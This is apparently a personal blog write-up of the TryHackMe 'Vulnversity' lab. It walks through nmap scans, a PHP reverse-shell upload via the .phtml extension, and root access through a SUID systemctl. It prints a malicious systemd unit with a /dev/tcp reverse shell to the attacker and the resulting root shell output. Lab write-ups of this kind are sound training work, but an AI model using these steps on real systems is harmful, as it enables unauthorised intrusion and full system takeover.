---
title: Try Hack Me Vulnversity Writeup
tags:
- writeup
- tryhackme
image: /images/vulnversity/info.png
---

Welcome to the first ever tryhackme writeup! Let me rephrase that... Welcome to **my** first ever tryhackme writeup! Yes this time it is not a hackthebox writeup. I already have written writeups for the machines buff and blunder but cannot release them till they expire and I am not a huge fan of password protecting my content. So till then I will just keep rooting machines and release their writeups when the time is right. Also I will probably only release writeups of those tryhackme rooms which actually taught me something rather than just posting for the sake of it. Enough blabbering! Let's get rooting!

<!--more-->

<img src="/images/vulnversity/info.png" />

SO I would describe this room as an extra easy level on hackthbox difficulty scale because most of the things you have to do are already given and I am just realizing while writing that this is a totally different thing altogether. Nonetheless It taught me something and here I am. 

## Reconnaissance

I had to look up the spelling for that. So taking questions in order:

- How many open ports?
Doing a quick default scan

{% highlight bash %}
nmap -T4 10.10.79.20

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-27 10:17 IST
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 52.42% done; ETC: 10:17 (0:00:09 remaining)
Nmap scan report for 10.10.79.20
Host is up (0.24s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
{% endhighlight %}

- What is the version of squid proxy?

Doing a quick version scan 

{% highlight bash %}
nmap -sV -p3128 10.10.79.20

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-27 10:18 IST
Nmap scan report for 10.10.79.20
Host is up (0.26s latency).

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12

{% endhighlight %}

- How many ports will nmap scan if the flag -p-400 was used?

Since we know that `-p-` flag scans all the ports we can safely say that `-p-400` will scan port 1 to 400. 

- Using the nmap flag -n what will it not resolve?

Looking at the man page for nmap 
{% highlight bash %}
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
{% endhighlight %}

And taking a look at [nmap documentation](https://nmap.org/book/host-discovery-dns.html) for what that means. We come to the conclusion that nmap automatically performs reverse dns resolution (i.e converting ip addresses to names like converting 172.217.160.142 to google.com) to find out more information about targets. We can stop this process to maybe speed up the scanning process and use`-n` flag to do that.

- What is the most likely operating system this machine is running?

Doing a quick OS finger printing scan 

{% highlight bash %}
sudo nmap -O -T4 10.10.79.20

--snip--
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
--snip--
{% endhighlight %}

It doesn't really work. Let's pull out the big guns and do an aggressive scan.

{%highlight bash%}
nmap -A -T4 -v 10.10.79.20

--snip--
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-08-27T00:53:44-04:00
--snip--
{%endhighlight%}

A bit overkill but it worked. So it is an ubuntu machine.

- What port is the web server running on?

Final question of this section. I see a port 3333 in the previous scan with the name of service as dec-notes. I try it as the answer and it says correct. But that wasn't satisfying enough so I try to find something on it, there is not much information for this particular port. All I could find was

`"DEC Notes is a program for electronic conferencing. DEC Notes is a computer-mediated conferencing system that lets you conduct online conferences or meetings. It's basically a bulletin board service.Personally, I've only seen DEC Notes servers on VAX's but that was several years ago.`

But nothing here says anything about a web server. I want to dig deeper but we are not going down that rabbit hole today... so maybe I will come back to this later.

## Locating Directories

Easy section again. I used dirbuster rather than gobuster because I like the tree structure feature. Busting with a common.txt wordlist I find

<img src="/images/vulnversity/dirbust.png" />

The directory /internal looks interesting. I browse to it in the browser and find an upload form.


## Foothold

This section was pretty well explained in the room only so I will skip to the part where we get the webshell. 

So as the room says we first get the webshell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Rename it with the extension .phtml. So the extension .phtml was new for me and I did some research(google) and found that commonly there is not difference between php and phtml. php is used when there is no content to be displayed and phtml is used when there is some dynamically created content that is to be displayed. phtml is literally mixture of php and html.

Then we change the values of IP and port in the webshell file to your own and start a netcat listener according to the port you entered. Use the upload functionality to upload the webshell and browse to something like `http://roomIP:3333/internal/uploads/php-reverse-shell.phtml`

And you should receive a shell from the victim machine. Use `whoami` command and we see we are www-data. Sweeeet!

<img src="/images/vulnversity/shell.png" />

Browsing to /home or read contents of /etc/passwd we can see one user bill and we are able to read the user flag too.

## Privilege Escalation

Finally the most fun part! This section tells us about binaries with suid bit set. This is what I understand: Normally there are three bits r,w,and x representing read,write and execute permissions and when do something like `ls -al` you see them at the left side of each file. When you see a 's' bit instead of 'x' it is said that the suid bit is set. When suid bit is set/on that means you can run that file as if you were the owner of that file. This is particulary interesting because if a file is owned by lets say a root user and it's suid bit is set then we can run that file as root too. For hackers this feature is just asking to be exploited. 

[Refer this](https://www.linuxnix.com/suid-set-suid-linuxunix/) for further information on SUIDs.

Since this section talks about suid bits we can safely say we have to use this mechanism to escalate our privileges. We can find all the binaries with suid bit set using my (sloppy) way like moving to the /bin directory and do `ls -al | grep rws`. What this does is list all the binaries in the bin and catch the ones with s bit. This method doesn't list all the suid binaries in the machine, just the ones in the /bin. Doing it the proper way you can do `find / -user root -perm -4000 -exec ls -ldb {} \;`

Here is the output

{%highlight bash%}
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
{%endhighlight%}

The binary which stands out to me is systemctl because I haven't seen it ever having suid bit set. systemctl is used to manage services like starting/stopping them. This means that since this binary has suid bit set we can run services with root privilege. Do you smell that? It's the sweet sweet smell of privilege escalation...

I knew that I can run services with root privileges but which one? while finding the answer to this I stumble across this [awesome article](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49). It has exactly what I want to do. So I learned today that we can make our own services and run them! Here is the service I created while reading the article:

{%highlight bash%}
[Unit]
Description=rootertooterbaby

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YourIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
{%endhighlight%}

and save it as something like rooter.service

Making your own service is pretty easy. All of them follow this exact pattern with some additional options. 
Now I wasn't able to create the file on the system so I made it on my machine first and transferred it to victim using a python server and wget.

Then all I had to do was start a netcat listener on the port 9999 and run my custom service using:

{%highlight bash%}
$ /bin/systemctl enable /tmp/rooter.service
/bin/systemctl enable /tmp/rooter.service
Created symlink from /etc/systemd/system/multi-user.target.wants/rooter.service to /tmp/rooter.service.
Created symlink from /etc/systemd/system/rooter.service to /tmp/rooter.service.
$ /bin/systemctl start rooter
/bin/systemctl start rooter
{%endhighlight%}

And guess what I saw on my netcat listener? :)

{%highlight bash%}
nc -lvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.64.169 51376 received!
bash: cannot set terminal process group (1579): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/#
{%endhighlight%}

Now you can just get the root flag. This room was a real breath of fresh air after taking some break from those hardcore tear inducing hackthebox machines.
Well that's it for now... See you in the next one! 



